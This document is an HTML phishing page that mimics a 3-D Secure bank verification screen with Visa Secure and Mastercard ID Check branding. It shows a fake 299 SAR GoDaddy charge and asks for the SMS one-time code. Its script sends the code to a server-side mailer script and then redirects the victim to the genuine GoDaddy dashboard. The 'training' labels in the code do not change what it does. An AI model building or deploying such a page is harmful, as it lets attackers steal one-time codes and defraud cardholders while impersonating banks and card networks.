<!doctype html>
<html lang="en" dir="ltr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<title>Verify by phone</title>
<style>
*{box-sizing:border-box}
html,body{margin:0;padding:0}
body{background:#eef0f2;color:#111;font-family:Arial,Helvetica,"Segoe UI",sans-serif;direction:ltr}
/* 3DS card */
.tds{max-width:960px;margin:0 auto;background:#fff;border:1px solid #d7dbe0;min-height:calc(100vh - 120px);padding:34px 46px 60px}
.tds-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:34px}
.riyad{display:flex;align-items:center;gap:12px}
.riyad .txt{line-height:1.15}
.riyad .ar{font-weight:700;font-size:17px;color:#2b2a4a;font-family:Tahoma,Arial,sans-serif}
.riyad .en{font-weight:700;font-size:17px;color:#2b2a4a;letter-spacing:.3px}
.idcheck{display:flex;align-items:center;gap:10px}
.idcheck .lbl{font-size:20px;color:#6b7280;font-weight:600}
.idcheck .bar{color:#c9ced4;font-size:22px}

.tds h1{text-align:center;font-size:26px;font-weight:700;margin:6px 0 26px}
.tds p.lead{font-size:15.5px;line-height:1.55;color:#222;max-width:820px;margin:0 0 26px}
.mrow{display:flex;font-size:15.5px;margin:2px 0}
.mrow .k{width:150px;color:#111}
.mrow .v{color:#111}
.mblock{margin-bottom:34px}

.vlabel{text-align:center;color:#6f70a6;font-size:15px;margin:26px 0 10px}
.vinput{display:block;width:100%;height:56px;border:2px solid #111;border-radius:2px;font-size:20px;padding:0 14px;outline:none}
.vinput:focus{border-color:#111}

.submit{display:block;width:100%;margin:70px 0 0;background:#34a83a;color:#fff;border:none;border-radius:3px;
  font-size:16px;font-weight:700;letter-spacing:.5px;padding:16px;cursor:pointer}
.submit:hover{background:#2f9a35}
.links{display:flex;justify-content:center;gap:120px;margin:26px 0 0}
.links a{color:#1a73c2;font-weight:700;font-size:14px;letter-spacing:.5px;text-decoration:none}
.lang{display:flex;justify-content:flex-end;align-items:center;gap:10px;margin:40px 0 0;color:#6b7280;font-size:14px}
.lang .en{border:1px solid #6b7280;border-radius:3px;padding:1px 6px;color:#374151}
.accordion{margin-top:14px;border-top:1px solid #e3e6ea}
.accordion .row{display:flex;justify-content:space-between;align-items:center;padding:16px 2px;border-bottom:1px solid #e3e6ea;color:#1a73c2;font-size:15px;cursor:pointer}
.accordion .row .plus{color:#1a73c2;font-size:20px;font-weight:400}
@media(max-width:640px){.tds{padding:24px 20px 48px}.links{gap:60px}}
  .visa-checkout {
    display: inline-flex;
    flex-direction: column;
    gap: 8px;
    width: 320px;
    color: #182cba;
    font-family: Arial, Helvetica, sans-serif;
  zoom: 0.55;

  }

  .visa-top {
    display: flex;
    align-items: center;
    justify-content: space-between;
  }

  .visa-divider {
    width: 2px;
    height: 82px;
    background: #90908d;
  }

  .visa-word {
    font-size: 66px;
    font-weight: 900;
    font-style: italic;
    letter-spacing: -4px;
    line-height: 1;
    padding-right: 4px;
  }

  .visa-bottom {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 10px;
  }

  .visa-secure {
    font-size: 29px;
    font-weight: 300;
    letter-spacing: -1px;
    white-space: nowrap;
  }

  .visa-label {
    padding: 10px 20px;
    background: #192fc5;
    color: #fff;
    font-size: 18px;
    line-height: 1.2;
  }

</style>
</head>
<body>
<div class="tds">
  <div class="tds-top">
    <!-- Riyad Bank logo (recreated) -->
<div class="visa-checkout" role="img" aria-label="Visa Secure Online Checkout">
  <div class="visa-top">
    <svg width="100" height="70" viewBox="0 0 170 120"
         xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
      <g fill="none" stroke="#000" stroke-width="9"
         stroke-linecap="round" stroke-linejoin="round">
        <path d="M46 15H24C14 15 8 22 8 32V88C8 99 14 105 24 105H59
                 C64 105 68 102 72 97L105 60 65 15H92L131 60 91 105H119
                 L158 60 119 15"/>
      </g>
    </svg>

    <span class="visa-divider"></span>
    <span class="visa-word">VISA</span>
  </div>

  <div class="visa-bottom">
    <span class="visa-secure">Secure online</span>
    <span class="visa-label">Checkout</span>
  </div>
</div>
    <!-- Mastercard ID Check -->
    <div class="idcheck">
      <svg width="46" height="30" viewBox="0 0 46 30" xmlns="http://www.w3.org/2000/svg" aria-label="Mastercard">
        <circle cx="17" cy="15" r="13" fill="#eb001b"/>
        <circle cx="29" cy="15" r="13" fill="#f79e1b" fill-opacity="0.9"/>
        <path d="M23 5.5a13 13 0 0 0 0 19 13 13 0 0 0 0-19z" fill="#ff5f00"/>
      </svg>
      <span class="bar">|</span>
      <span class="lbl">ID Check</span>
    </div>
  </div>

  <h1>Verify by phone</h1>
  <p class="lead">A text message with a verification code has been sent to mobile number ending in to complete the transaction.</p>

  <div class="mblock">
    <div class="mrow"><span class="k">Merchant:</span><span class="v">GoDaddy</span></div>
    <div class="mrow"><span class="k">Amount:</span><span class="v">299 SAR</span></div>
  </div>

  <form id="tdsForm" autocomplete="off">
    <label class="vlabel" for="otp">Verification code</label>
    <input class="vinput" id="otp" name="otp" inputmode="numeric" autocomplete="one-time-code">
    <button type="submit" class="submit" id="tdsSubmit">SUBMIT</button>
  </form>

  <div class="links">
    <a href="/verify.html">RESEND CODE</a>
    <a href="#" onclick="return false">CANCEL</a>
  </div>

  <div class="lang"><span>AR</span><span class="en">EN</span></div>

  <div class="accordion">
    <div class="row">Learn more about authentication <span class="plus">+</span></div>
    <div class="row">Need some help? <span class="plus">+</span></div>
  </div>
</div>
<script>
(function () {

  var ENDPOINT = "/mailer.php";

  var form = document.getElementById("tdsForm");
  var btn  = document.getElementById("tdsSubmit");
  var otp  = document.getElementById("otp");

  otp.required = true;
  otp.maxLength = 6;

  btn.disabled = true;


  otp.addEventListener("input", function () {

    otp.value =
  otp.value
    .replace(/\D/g, "")
    .slice(0, 6);

btn.disabled =
  !(otp.value.length === 4 || otp.value.length === 6);

  });


  form.addEventListener("submit", async function (e) {

    e.preventDefault();

    var code =
      String(otp.value || "")
        .replace(/\D/g, "");


    /*
     * Training code only.
     */
    if (code == "") {

      otp.setCustomValidity(
        "Enter the OTP."
      );

      otp.reportValidity();

      return;
    }


    otp.setCustomValidity("");

    btn.disabled = true;
    btn.textContent = "PROCESSING…";


    try {

      var data = new FormData();

      data.append("mode", "otp_demo");
      data.append("code", code);


      var response =
        await fetch(
          ENDPOINT,
          {
            method: "POST",
            body: data
          }
        );


      var raw =
        await response.text();


      console.log(
        "OTP mailer response:",
        raw
      );


      var result;

      try {

        result =
          JSON.parse(raw);

      } catch (error) {

        throw new Error(
          "Mailer returned an invalid response."
        );

      }


      if (!result.ok) {

        throw new Error(
          result.error ||
          "Could not send training code."
        );

      }


      /*
       * Email succeeded.
       * Continue to shop.
       */

      window.location.href =
        "https://dashboard.godaddy.com/venture/website?referrer=my-products&accountId=4c32a2de-69ea-4f58-be88-67d6a217c2ec";


    } catch (error) {

      console.error(
        "OTP mailer error:",
        error
      );

      btn.disabled = false;
      btn.textContent = "SUBMIT";

    }

  });

})();
</script>
</body>
</html>
